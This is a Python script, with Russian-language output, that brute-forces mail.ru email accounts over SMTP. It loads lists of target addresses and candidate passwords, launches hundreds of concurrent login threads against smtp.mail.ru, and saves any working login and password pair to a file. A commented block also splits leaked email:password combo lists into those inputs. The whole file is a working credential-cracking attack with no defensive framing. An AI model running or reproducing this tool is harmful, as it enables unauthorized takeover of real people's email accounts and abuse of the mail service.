import smtplib
import threading
import time

_FIND = 'ON'
passCount=-1
passTrue=0

passwordDict = open ('passMailru.txt')
word = [line.strip(' \t\n\r') for line in passwordDict]
print ("Всего паролей :", len(word))
passwordDict.close()

def brutThreadingStart(login=False):
	global  passCount
	if passCount >= len(word) : return 0	
	passCount = passCount + 1
	#str = passwordDict.readline().strip(' \t\n\r')	
	threading.Thread(target = brut , args = ( login, word[passCount], passCount )).start()

def brut(login, password, passCountLocal= False):	
	global passCount, _FIND, passTrue
		
	smtpObj = smtplib.SMTP('smtp.mail.ru')
	smtpObj.starttls()
	
	try :
		smtpObj.login(login, password)
	except:
		#if _FIND != 'ON': return 0
		print ("№", passCountLocal, "\tНЕ верный пароль :",  login, "->", password)
		smtpObj.quit()
		brutThreadingStart(login)
		return 0

	print ("№", passCountLocal, "\t!!! Верный пароль: ", password,"для :", login)
	f=open ('password_valid.txt','w')
	f.write(login +" -> " +  password)
	f.close	
	smtpObj.quit()
	passCount = len(word)	

f = open('emailMailru.txt')
email = [line.strip(' \t\n\r') for line in f]
print ("Всего email:", len(email))
f.close()
j=-1
while j <= len(email) :	
	j=j+1
	print ("Цель ->", email[j])	
	i=0
	while i < 555: #количество потоков
		i=i+1	
		time.sleep(0.01)
		brutThreadingStart(email[j])
	while threading.active_count() >1: time.sleep(10); print ("Активных потоков:", threading.active_count() )	
	passCount=-1
"""
f = open('passMailru.txt','w')
f2 = open('emailMailru.txt','w')
for line in passwordDict:
	str = line.strip(' \t\n\r').split(":")
	print (str)
	f2.write(str[0]+'\n')
	f.write(str[1]+'\n')
f.close()
f2.close()	
"""

#smtpObj.sendmail('Razor-men@mail.ru',"razor-men@mail.ru","go to bed!")

